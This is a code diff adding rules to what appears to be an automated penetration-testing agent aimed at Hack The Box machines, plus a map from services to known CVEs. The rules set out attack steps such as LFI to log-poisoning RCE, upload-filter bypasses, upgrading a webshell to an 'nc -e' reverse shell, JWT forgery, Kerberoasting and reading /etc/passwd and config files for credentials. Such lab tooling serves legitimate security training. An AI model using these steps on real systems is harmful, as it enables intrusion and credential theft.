+    {"if": "Flask/Werkzeug detected with debug mode", "then": "access /console and compute Werkzeug PIN",
+     "reasoning": "Werkzeug debugger PIN is computed from machine-id + MAC + cgroup. Read via LFI then compute.", "priority": 1},
+
+    # LFI / File Inclusion
+    {"if": "URL has parameter like ?page=, ?file=, ?include=, ?path=", "then": "test for LFI with ../../etc/passwd",
+     "reasoning": "File inclusion parameters are the #1 LFI entry point. Try path traversal first, "
+                  "then PHP wrappers (php://filter, php://input, data://).", "priority": 2},
+    {"if": "LFI confirmed (can read /etc/passwd)", "then": "read web app config files then try log poisoning for RCE",
+     "reasoning": "LFI → read wp-config.php, .env, config.php for DB creds. If PHP, log poison for RCE: "
+                  "inject PHP in User-Agent, include access.log via LFI.", "priority": 1},
+    {"if": "PHP application with LFI", "then": "try php://filter/convert.base64-encode/resource= for source code",
+     "reasoning": "php://filter reads PHP source without execution. Reveals credentials, logic, and more LFI paths.", "priority": 2},
+
+    # File Upload
+    {"if": "file upload form found", "then": "test upload restrictions: extension, MIME type, magic bytes, size",
+     "reasoning": "Systematically bypass: .php→.phtml→.php5→.pht→GIF89a;<?php→double extension .php.jpg→null byte.", "priority": 2},
+    {"if": "webshell uploaded successfully", "then": "immediately upgrade to reverse shell",
+     "reasoning": "Webshell is fragile (logged, detected). Get reverse shell ASAP: bash -c '...' or nc -e.", "priority": 1},
+
+    # JWT / Authentication
+    {"if": "JWT token found in cookies or Authorization header", "then": "decode at jwt.io, check algorithm, try alg:none",
+     "reasoning": "JWT alg:none bypasses signature. HS256 with weak secret cracks with hashcat. "
+                  "RS256→HS256 confusion uses public key as HMAC secret.", "priority": 2},
+    {"if": "JWT secret cracked or algorithm bypassed", "then": "forge admin JWT and access admin panel",
+     "reasoning": "Modify role/is_admin claims, re-sign, and use for admin access.", "priority": 1},
+
+    # SSRF
+    {"if": "web app has URL/fetch/proxy parameter and nmap shows filtered ports", "then": "exploit SSRF to access filtered ports",
+     "reasoning": "SSRF proxies through the server to reach internal/filtered services. "
+                  "Try 127.0.0.1, localhost, 0.0.0.0, [::1], decimal/hex IP encodings.", "priority": 1},
+
+    # API
+    {"if": "API endpoints discovered (/api/, /v1/, /graphql)", "then": "test for IDOR, auth bypass, and injection",
+     "reasoning": "APIs often lack proper authorization. Test sequential IDs, missing auth headers, "
+                  "parameter injection. GraphQL introspection reveals full schema.", "priority": 2},
+    {"if": "GraphQL endpoint found", "then": "run introspection query {__schema{types{name,fields{name}}}}",
+     "reasoning": "Introspection maps entire API including hidden mutations and admin queries.", "priority": 2},
+
+    # Git / Source Code
+    {"if": "/.git/HEAD accessible on web server", "then": "use git-dumper to clone the repo and search history for creds",
+     "reasoning": "Exposed .git = full source code + commit history. Developers commit and later 'remove' credentials.", "priority": 1},
+    {"if": "source code obtained (git dump, backup, LFI)", "then": "grep for passwords, secrets, keys, tokens, database connections",
+     "reasoning": "Source code analysis finds hardcoded creds, API keys, DB connection strings, and hidden endpoints.", "priority": 1},
+
+    # Image / Steganography
+    {"if": "images found on web app or downloaded files", "then": "run exiftool, strings, binwalk on each image",
+     "reasoning": "Images may contain: EXIF metadata with hints, steghide-embedded files, binwalk-extractable archives. "
+                  "Always analyze downloaded images systematically.", "priority": 3},
+    {"if": "steghide or binwalk reveals embedded data", "then": "extract and analyze (may contain SSH keys, passwords, hints)",
+     "reasoning": "Embedded data in images commonly contains SSH private keys, password files, or next-step hints.", "priority": 2},
+
+    # Subdomain / VHost
+    {"if": "web app redirects to hostname (e.g., target.htb)", "then": "add to /etc/hosts then enumerate subdomains with ffuf vhost",
+     "reasoning": "Virtual hosts hide separate applications. ffuf -H 'Host: FUZZ.target.htb' discovers them. "
+                  "Hidden vhosts are often dev/staging instances with more vulnerabilities.", "priority": 2},
+
+    # Credential Reuse
+    {"if": "credentials found in any service (DB, app, env, config)", "then": "try same creds for SSH and all other services",
+     "reasoning": "Password reuse is THE most reliable escalation path. DB password = SSH password in ~60% of HTB boxes.", "priority": 1},
+    {"if": "password hash found (MD5, SHA1, bcrypt)", "then": "crack with hashcat or john using rockyou.txt, then try CrackStation online",
+     "reasoning": "Most HTB passwords are in rockyou.txt. MD5/SHA1 crack in seconds. Always try before moving on.", "priority": 1},
+
+    # Deserialization
+    {"if": "Java application detected (JSESSIONID, .do, .action extensions)", "then": "check for deserialization endpoints",
+     "reasoning": "Java apps with serialized objects in cookies/parameters are exploitable with ysoserial. "
+                  "Look for base64 starting with rO0AB (Java serialized magic bytes).", "priority": 2},
+    {"if": "PHP application with serialize/unserialize in source", "then": "craft PHP object injection payload with phpggc",
+     "reasoning": "PHP unserialize with user input leads to arbitrary object instantiation. "
+                  "phpggc generates gadget chains for common frameworks (Laravel, Symfony, Monolog).", "priority": 2},
+
+    # Active Directory
+    {"if": "Windows domain environment (port 88 Kerberos, 389 LDAP)", "then": "enumerate domain with enum4linux, ldapsearch, crackmapexec",
+     "reasoning": "AD enumeration reveals users, groups, shares, GPOs. Start with anonymous/null session.", "priority": 2},
+    {"if": "domain user credentials obtained", "then": "AS-REP Roast and Kerberoast before brute-forcing",
+     "reasoning": "Kerberoasting and AS-REP Roasting extract crackable tickets from AD. Much stealthier than brute-force.", "priority": 1},
+    {"if": "Group Policy Preferences (GPP) found in SYSVOL share", "then": "extract and decrypt cPassword from Groups.xml",
+     "reasoning": "Microsoft published the AES key for GPP passwords. gpp-decrypt gives plaintext instantly.", "priority": 1},
     
     # Phase transition reasoning
     {"if": "in RECON with 5+ ports and 3+ services identified", "then": "transition to ENUMERATION",
@@ -2267,6 +3412,65 @@ HTB_CVE_SERVICE_MAP = {
     "Jenkins (no auth)": ["Groovy console RCE"],
     "Tomcat (default creds)": ["WAR deploy RCE"],
     "Memcached": ["unauthenticated cache dump"],
+
+    # Phase 42: Expanded CVE → Service mappings
+    "nginx": ["CVE-2021-23017", "CVE-2017-7529"],
+    "nginx + PHP-FPM": ["CVE-2019-11043"],
+    "PHP-CGI (Windows)": ["CVE-2024-4577"],
+    "PHP-FPM": ["CVE-2019-11043"],
+    "PHP": ["CVE-2023-3824", "CVE-2012-1823", "CVE-2024-4577"],
+    "ImageMagick": ["CVE-2016-3714"],
+    "ImageTragick": ["CVE-2016-3714"],
+    "Werkzeug": ["CVE-2019-14322"],
+    "Flask (debug)": ["CVE-2019-14322"],
+    "Jinja2": ["CVE-2024-34064", "ssti-jinja2"],
+    "js2py": ["CVE-2024-28397"],
+    "Laravel Ignition": ["CVE-2021-3129"],
+    "Laravel": ["CVE-2021-3129"],
+    "Apache 2.4.49": ["CVE-2021-41773"],
+    "Apache 2.4.50": ["CVE-2021-42013"],
+    "Apache mod_proxy": ["CVE-2023-25690"],
+    "Drupal 7": ["CVE-2018-7600", "CVE-2014-3704"],
+    "Drupal 8": ["CVE-2018-7600", "CVE-2018-7602"],
+    "Drupalgeddon": ["CVE-2018-7600", "CVE-2014-3704"],
+    "Joomla": ["CVE-2015-8562"],
+    "WordPress": ["CVE-2022-0739", "CVE-2021-29447", "CVE-2023-2982"],
+    "WordPress BookingPress": ["CVE-2022-0739"],
+    "Node.js systeminformation": ["CVE-2021-21315"],
+    "EJS": ["CVE-2022-29078"],
+    "Kibana": ["CVE-2019-7609"],
+    "Tomcat AJP": ["CVE-2020-1938"],
+    "Ghostcat": ["CVE-2020-1938"],
+    "Tomcat PUT": ["CVE-2017-12617"],
+    "Spring": ["CVE-2022-22965"],
+    "Spring4Shell": ["CVE-2022-22965"],
+    "Tomcat FileStore": ["CVE-2020-9484"],
+    "Commons Collections": ["CVE-2015-7501"],
+    "WebLogic": ["CVE-2020-2555"],
+    "Struts 2 REST": ["CVE-2017-9805"],
+    "JWT": ["CVE-2018-0114", "CVE-2022-23529"],
+    "jsonwebtoken": ["CVE-2022-23529"],
+    "Exchange": ["CVE-2021-26855"],
+    "ProxyLogon": ["CVE-2021-26855"],
+    "Redis Lua": ["CVE-2022-0543"],
+    "Redis": ["CVE-2015-4335", "CVE-2022-0543"],
+    "Docker runC": ["CVE-2019-5736"],
+    "containerd": ["CVE-2020-15257"],
+    "ExifTool": ["CVE-2021-22204"],
+    "OpenSSH < 7.7": ["CVE-2018-15473"],
+    "Samba 3.5+": ["CVE-2017-7494"],
+    "SambaCry": ["CVE-2017-7494"],
+    "Twig": ["ssti-twig"],
+    "FreeMarker": ["ssti-freemarker"],
+    "Smarty": ["ssti-smarty"],
+    "Handlebars": ["ssti-handlebars"],
+    "GraphQL": ["graphql-introspection"],
+    "Active Directory": ["CVE-2020-1472", "CVE-2021-42278", "CVE-2022-26923"],
+    "ADCS": ["CVE-2022-26923"],
+    "noPac": ["CVE-2021-42278"],
+    "Certifried": ["CVE-2022-26923"],
+    "Zimbra": ["CVE-2023-37580"],
+    "Git (exposed)": ["exposed-.git"],
 }
 
 
